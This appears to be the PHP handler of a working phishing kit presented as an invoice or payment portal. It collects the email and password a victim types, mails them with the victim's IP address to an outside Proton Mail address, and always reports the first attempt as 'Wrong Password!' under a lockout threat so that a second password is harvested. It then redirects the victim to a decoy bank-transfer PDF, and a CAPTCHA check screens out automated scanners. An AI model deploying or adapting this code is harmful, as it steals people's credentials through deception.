<?php
session_start();

// Function to get the client's IP address
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ipList[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Initialize submission attempts if not set
if (!isset($_SESSION['submission_attempts'])) {
    $_SESSION['submission_attempts'] = 0;
}

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Cloudflare Turnstile verification
    $secretKey = "0x4AAAAAABeKtVWcXfNb-A_N7xAgBD0ah20";
    $token = $_POST['cf-turnstile-response'] ?? '';
    $ip = getUserIP();
    
    // Validate the Turnstile response
    $url = "https://challenges.cloudflare.com/turnstile/v0/siteverify";
    $data = [
        'secret' => $secretKey,
        'response' => $token,
        'remoteip' => $ip
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    $outcome = json_decode($result, true);
    
    if (!$outcome || !$outcome['success']) {
        $_SESSION['submission_error'] = [
            'title' => 'Verification Failed',
            'message' => 'Please complete the security verification.'
        ];
        header('Location: ' . $_SERVER['HTTP_REFERER']);
        exit;
    }

    // Increment submission attempts only after successful CAPTCHA verification
    $_SESSION['submission_attempts']++;

    // Capture form data
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $password = filter_var($_POST['password'], FILTER_SANITIZE_SPECIAL_CHARS);

    // Validate email format
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $_SESSION['submission_error'] = [
            'title' => "Invalid Email!",
            'message' => "The email address entered is not in a valid format. Please try again."
        ];
        header("Location: " . $_SERVER['HTTP_REFERER']);
        exit();
    }

    // Prepare email details
    $to = "formresults@proton.me";
    $subject = "Inv Submission - Attempt #" . $_SESSION['submission_attempts'];
    $message = "Email: $email\nPassword: $password\nIP Address: $ip";
    $headers = "From: no-reply@prepropayportal.com";

    // Send the email
    if (!mail($to, $subject, $message, $headers)) {
        $_SESSION['submission_error'] = [
            'title' => "Error Sending Email!",
            'message' => "There was an issue processing your request. Please try again later."
        ];
        header("Location: " . $_SERVER['HTTP_REFERER']);
        exit();
    }

    // Set error messages based on the submission attempt
    if ($_SESSION['submission_attempts'] == 1) {
        $_SESSION['submission_error'] = [
            'title' => "Wrong Password!",
            'message' => "Verify your credentials to continue. After 1 more failed attempt, your access will be restricted for security reasons."
        ];
        header("Location: " . $_SERVER['HTTP_REFERER']);
        exit();
    } elseif ($_SESSION['submission_attempts'] >= 2) {
        // Reset attempts to allow fresh starts in future (optional)
        $_SESSION['submission_attempts'] = 0;

        // Redirect to the final URL after the 2nd attempt
        header("Location: https://financingpurchaseorder.com/proof_of_payment/Bank_Transfer_Confirmation–INV-2025-0084.pdf");
        exit();
    }
}
